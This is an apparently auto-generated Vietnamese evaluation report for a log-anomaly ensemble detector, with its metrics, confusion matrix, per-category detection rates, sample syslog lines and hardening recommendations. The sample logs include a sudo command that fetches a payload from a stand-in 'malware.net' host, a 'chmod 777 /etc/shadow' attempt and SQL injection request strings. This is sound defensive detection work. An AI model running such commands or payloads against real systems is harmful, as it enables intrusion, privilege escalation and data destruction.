# Evaluation Report: Ensemble Detector

> Sinh tự động: 2026-06-12 16:21:48

## 1. Tổng quan (Overview)

| Chỉ số | Giá trị |
|---|---|
| Tổng số dòng log | 5000 |
| Số bất thường phát hiện | 384 |
| Tỷ lệ phát hiện | 7.7% |
| Accuracy | 0.8948 |
| Precision | 0.4661 |
| Recall | 0.358 |
| F1 Score | 0.405 |

## 2. Ma trận nhầm lẫn (Confusion Matrix)

| | Dự đoán Bình thường | Dự đoán Bất thường |
|---|---|---|
| **Thực tế Bình thường** | TN = 4295 | FP = 205 |
| **Thực tế Bất thường** | FN = 321 | TP = 179 |

## 3. Phân bố bất thường theo loại (Anomaly Breakdown)

| Loại bất thường | Phát hiện | Tổng trong GT | Tỷ lệ | Attack Category |
|---|---|---|---|---|
| `None` | 205 | 0 | 0.0% | Unknown |
| `reverse_lookup_failure` | 56 | 56 | 100.0% | Reconnaissance |
| `suspicious_sudo` | 56 | 56 | 100.0% | Privilege Escalation |
| `service_crash` | 33 | 55 | 60.0% | Denial of Service / System Failure |
| `sql_injection` | 29 | 55 | 52.7% | Web Application Attack / Injection |
| `invalid_user` | 5 | 56 | 8.9% | Brute Force / Credential Attack |

## 4. Phân tích chi tiết (Detailed Analysis)

### 4.1. `None`

**Mô tả**: Không có mô tả.

**Phát hiện**: 205

**Attack Category**: Unknown

**Mẫu log**:

```
  [Line 2] NET: Registered protocol family 10
  [Line 16] Starting Rotate log files...
  [Line 19] NET: Registered protocol family 10
```

### 4.2. `reverse_lookup_failure`

**Mô tả**: Không thể phân giải ngược DNS cho IP kết nối đến. Có thể là dấu hiệu của IP giả mạo hoặc máy chủ C&C không có PTR record.

**Phát hiện**: 56/56 (100.0%)

**Attack Category**: Reconnaissance

**Mẫu log**:

```
  [Line 4504] Unable to resolve hostname for 198.51.100.200: Name or service not known
  [Line 4513] Unable to resolve hostname for 198.51.100.200: Name or service not known
  [Line 4522] Unable to resolve hostname for 198.51.100.200: Name or service not known
```

### 4.3. `suspicious_sudo`

**Mô tả**: Lệnh sudo đáng ngờ — người dùng không có quyền (nobody, www-data) cố gắng chạy lệnh với quyền root, hoặc thực thi script từ URL độc hại.

**Phát hiện**: 56/56 (100.0%)

**Attack Category**: Privilege Escalation

**Mẫu log**:

```
  [Line 4505] nobody : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://malware.net/payload -O /tmp/.hidden
  [Line 4514] nobody : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://malware.net/payload -O /tmp/.hidden
  [Line 4523] guest : user NOT in sudoers ; TTY=pts/5 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/chmod 777 /etc/shadow
```

### 4.4. `service_crash`

**Mô tả**: Dịch vụ bị crash — segfault, kernel oops, NULL pointer dereference, soft lockup. Có thể do lỗi phần mềm hoặc tấn công DoS.

**Phát hiện**: 33/55 (60.0%)

**Attack Category**: Denial of Service / System Failure

**Mẫu log**:

```
  [Line 4527] kernel: NMI watchdog: BUG: soft lockup - CPU#2 stuck for 22s! [nginx:1620]
  [Line 4536] systemd[1]: sshd.service: Failed with result 'signal'
  [Line 4554] kernel: NMI watchdog: BUG: soft lockup - CPU#2 stuck for 22s! [nginx:1620]
```

### 4.5. `sql_injection`

**Mô tả**: SQL Injection — URL chứa cú pháp SQL (' OR '1'='1, UNION SELECT, DROP TABLE). Kẻ tấn công cố gắng khai thác lỗ hổng SQL injection.

**Phát hiện**: 29/55 (52.7%)

**Attack Category**: Web Application Attack / Injection

**Mẫu log**:

```
  [Line 4507] GET /search?q=%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1 500 67 "-" "curl/7.81.0"
  [Line 4525] GET /search?q=%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1 500 67 "-" "curl/7.81.0"
  [Line 4534] GET /api/users?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1 500 89 "-" "sqlmap/1.6"
```

### 4.6. `invalid_user`

**Mô tả**: Cố gắng đăng nhập SSH với tài khoản không tồn tại. Dấu hiệu rõ ràng của tấn công dò quét tài khoản (user enumeration).

**Phát hiện**: 5/56 (8.9%)

**Attack Category**: Brute Force / Credential Attack

**Mẫu log**:

```
  [Line 4601] Invalid user ubuntu from 198.51.100.33 port 60901
  [Line 4871] Invalid user ubuntu from 198.51.100.33 port 60901
  [Line 4952] Invalid user ubuntu from 198.51.100.33 port 60901
```

## 5. Phân loại tấn công (Attack Classification)

| Attack Category | Số lượng | Tỷ lệ |
|---|---|
| Unknown | 205 | 53.4% |
| Reconnaissance | 56 | 14.6% |
| Privilege Escalation | 56 | 14.6% |
| Denial of Service / System Failure | 33 | 8.6% |
| Web Application Attack / Injection | 29 | 7.6% |
| Brute Force / Credential Attack | 5 | 1.3% |

## 6. Khuyến nghị (Recommendations)

### Với Reconnaissance

- Chặn các IP thực hiện port scan bằng iptables/nftables rules.
- Giới hạn tốc độ gói SYN (`--limit` trong iptables).
- Triển khai IDS/IPS (Snort, Suricata) để phát hiện scan pattern.
- Kiểm tra DNS PTR record — IP không có reverse DNS nên bị nghi ngờ.

### Với Privilege Escalation

- Rà soát file `/etc/sudoers` — loại bỏ quyền sudo không cần thiết.
- Không cho phép user `nobody`, `www-data` chạy sudo.
- Giám sát tất cả lệnh sudo được thực thi, đặc biệt từ user bất thường.
- Triển khai SELinux/AppArmor để giới hạn quyền process.
- Kiểm tra xem có backdoor nào được cài qua `wget`/`curl` không.

### Với Denial of Service / System Failure

- Điều tra nguyên nhân root cause của crash (kernel log, core dump).
- Cập nhật kernel và phần mềm lên phiên bản mới nhất.
- Triển khai giám sát service (systemd watchdog, monit).
- Cấu hình tự động restart service khi crash (`Restart=always`).
- Kiểm tra phần cứng — soft lockup có thể do lỗi CPU/RAM.

### Với Web Application Attack / Injection

- Triển khai Web Application Firewall (WAF) — ModSecurity, Cloudflare.
- Sử dụng prepared statements / parameterized queries cho database.
- Validate và sanitize tất cả user input.
- Chặn URL chứa ký tự đặc biệt (' OR, UNION, DROP, ../).
- Thực hiện penetration testing định kỳ cho web application.

### Với Brute Force / Credential Attack

- Kích hoạt fail2ban để tự động chặn IP sau N lần đăng nhập thất bại.
- Vô hiệu hóa đăng nhập root qua SSH (`PermitRootLogin no`).
- Triển khai xác thực khóa công khai (public key) thay vì password.
- Giới hạn số lần thử đăng nhập (`MaxAuthTries 3`).
- Giám sát số lượng failed password theo IP để phát hiện bất thường.

## 7. Hạn chế (Limitations)

### Các loại bất thường bị bỏ sót hoặc phát hiện một phần

| Loại | Phát hiện | Tổng | Tỷ lệ bỏ sót |
|---|---|---|---|
| `failed_password` | 0 | 56 | 100.0% |
| `invalid_user` | 5 | 56 | 91.1% |
| `brute_force` | 0 | 56 | 100.0% |
| `port_scan` | 0 | 55 | 100.0% |
| `sql_injection` | 29 | 55 | 47.3% |
| `directory_traversal` | 0 | 55 | 100.0% |
| `service_crash` | 33 | 55 | 40.0% |

### Nguyên nhân

- Ensemble majority_or kết hợp cả hai detector, nhưng KNN đóng góp rất ít (10 detection) nên kết quả gần như giống Centroid.
- Cần cải thiện KNN detector (hạ ngưỡng, tăng k) để ensemble có ý nghĩa hơn.

### Hướng cải thiện

- Thử nghiệm với threshold thấp hơn để tăng recall.
- Kết hợp thêm đặc trưng thời gian (temporal features).
- Sử dụng model embedding chuyên biệt cho syslog thay vì MiniLM đa dụng.
- Thêm detector thứ ba (Isolation Forest, LOF) để tăng diversity.
